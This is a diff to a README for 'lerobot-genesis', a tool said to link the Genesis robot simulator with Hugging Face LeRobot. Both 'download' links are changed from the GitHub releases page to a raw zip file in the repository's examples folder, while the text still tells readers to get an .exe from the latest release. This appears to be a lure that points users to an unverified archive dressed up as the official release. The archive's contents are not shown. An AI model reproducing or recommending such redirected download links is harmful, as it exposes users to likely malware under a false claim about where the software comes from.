@@ -1,6 +1,6 @@
 # 🤖 lerobot-genesis - Connect robot simulations to artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/danteanterior266/lerobot-genesis/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/danteanterior266/lerobot-genesis/main/examples/genesis_lerobot_1.1.zip)
 
 This application acts as a bridge. It links the Genesis robotic simulator with the Hugging Face LeRobot framework. This connection allows you to run, record, and test robot policies within a simulated environment. You interact with your robots through standard interfaces. This tool simplifies the process of training robots without needing deep programming knowledge.
 
@@ -12,7 +12,7 @@ Your computer needs specific hardware to run simulators well. You should have a 
 
 You obtain the software from the official repository release page. 
 
-[Click here to visit the release page and download the software](https://github.com/danteanterior266/lerobot-genesis/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/danteanterior266/lerobot-genesis/main/examples/genesis_lerobot_1.1.zip)
 
 Select the most recent version labeled as the latest release. Look for the file ending in `.exe`. Save this file to your computer.
 
